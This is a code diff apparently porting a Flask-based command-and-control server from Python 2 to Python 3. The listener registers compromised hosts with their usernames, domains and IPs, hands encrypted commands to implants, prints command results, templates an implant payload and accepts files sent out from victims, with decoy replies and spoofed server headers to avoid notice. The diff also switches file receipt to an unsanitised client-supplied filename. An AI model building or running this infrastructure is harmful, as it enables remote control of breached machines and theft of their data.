@@ -10,9 +10,9 @@ import signal
 import string
 import random
 from termcolor import colored
-from functions import *
-from encryption import *
-from esa import *
+from .functions import *
+from .encryption import *
+from .esa import *
 from flask import *
 import logging
 parentfolder = os.path.abspath("..")
@@ -60,7 +60,7 @@ class NewListener:
     if self.arguments == 8:
         # certficates path (worked !)
         self.ssl = True
-        print colored("SSL listener started !", "yellow")
+        print(colored("SSL listener started !", "yellow"))
         # self.cert ==> fullchain.pem
         # self.key  ==> key.pem
         # which is generated from letsencrypt certbot !
@@ -81,7 +81,7 @@ class NewListener:
         command_host_url = command_send_url.split("/")[1]
         pcode = f.read()
         pcode1 = pcode.replace("OCU_INTERVAL", str(self.interval))
-        pcode2 = pcode1.replace("OCT_KEY", aes_encryption_key)
+        pcode2 = pcode1.replace("OCT_KEY", str(aes_encryption_key))
         pcode3 = pcode2.replace("OCT_first_ping", first_ping_url.split("/")[1])
         pcode4 = pcode3.replace("OCT_command", command_host_url)
         pcode5 = pcode4.replace("OCT_report", report_url.split("/")[1])
@@ -201,14 +201,13 @@ def index():
 @app.route(file_receiver_url, methods=["POST"])
 def fr():
     filename = decrypt_command(aes_encryption_key, request.form["fn"].replace(" ","+"))
-    f = open("b", "wb")
+    f = open(filename.strip("\x00"), "wb")
     fdata = request.form["token"].replace(" ", "+")
-    raw_base64 = decrypt_command(aes_encryption_key, fdata)
-    print raw_base64.decode("UTF-16LE")
-    ready_to_write = base64.b64decode(raw_base64.decode("UTF-16LE"))
+    #raw_base64 = decrypt_command(aes_encryption_key, fdata)
+    ready_to_write = base64.b64decode(fdata.decode("UTF-16LE"))
     f.write(ready_to_write)
     f.close()
-    print colored("\n[+] File %s downloaded from the client !" % filename, "green")
+    print(colored("\n[+] File %s downloaded from the client !" % filename, "green"))
     response = make_response("Nothing to see here !")
     response.headers["Server"] = server_response_header
     return response
@@ -218,7 +217,7 @@ def fr():
 def report():
     encrypted_host = request.headers["App-Logic"]
     hostname = decrypt_command(aes_encryption_key, encrypted_host).strip("\x00")
-    for key in connections_information.keys():
+    for key in list(connections_information.keys()):
         if hostname in connections_information[key][2]:
             session = connections_information[key]
             header = request.headers["Authorization"]
@@ -235,7 +234,7 @@ def report():
 
 @app.route(command_send_url)
 def command(hostname):
-    for key in connections_information.keys():
+    for key in list(connections_information.keys()):
         if hostname in connections_information[key]:
             required_key = key
             connections_information[required_key][6] = time.ctime()
@@ -253,7 +252,7 @@ def command(hostname):
 def cr():
         #if request.method == "POST":
         encrypted_response = request.headers["Authorization"]
-        print "\nCommand execution result is : \n" + decrypt_command(aes_encryption_key, encrypted_response).strip("\x00") + "\n"
+        print("\nCommand execution result is : \n" + decrypt_command(aes_encryption_key, encrypted_response).strip("\x00") + "\n")
         return "Done"
 
         #else:
@@ -269,23 +268,23 @@ def page_not_found(e):
 
 @app.route(first_ping_url)
 def first_ping():
-    	    global counter
-            header = request.headers["Authorization"]
-            raw_request = decrypt_command(aes_encryption_key, header).strip("\x00").split(",")
-            hostname = raw_request[0]
-            if hostname in commands.keys():
-               return "HostName exist"
+        global counter
+        header = request.headers["Authorization"]
+        raw_request = str(decrypt_command(aes_encryption_key, header)).strip("\x00").split(",")
+        hostname = raw_request[0]
+        if hostname in list(commands.keys()):
+                return "HostName exist"
 
-            username = raw_request[1]
-            os_version = raw_request[2]
-            pid = raw_request[3]
-            domain = raw_request[4]
-            ip = request.environ['REMOTE_ADDR']
-            last_ping = time.ctime()
-            connections_information[counter] = [counter, ip, hostname, pid, username, domain, last_ping, os_version]
-            print "\n\x1b[6;30;42m new connection \x1b[0m from %s (%s) as session %s" %(username, ip, counter)
-            commands[hostname] = encrypt_command(aes_encryption_key, "False")
-            counter = counter + 1
-            response = make_response("")
-            response.headers["Server"] = server_response_header
-            return response
+        username = raw_request[1]
+        os_version = raw_request[2]
+        pid = raw_request[3]
+        domain = raw_request[4]
+        ip = request.environ['REMOTE_ADDR']
+        last_ping = time.ctime()
+        connections_information[counter] = [counter, ip, hostname, pid, username, domain, last_ping, os_version]
+        print("\n\x1b[6;30;42m new connection \x1b[0m from %s (%s) as session %s" %(username, ip, counter))
+        commands[hostname] = encrypt_command(aes_encryption_key, "False")
+        counter = counter + 1
+        response = make_response("")
+        response.headers["Server"] = server_response_header
+        return response
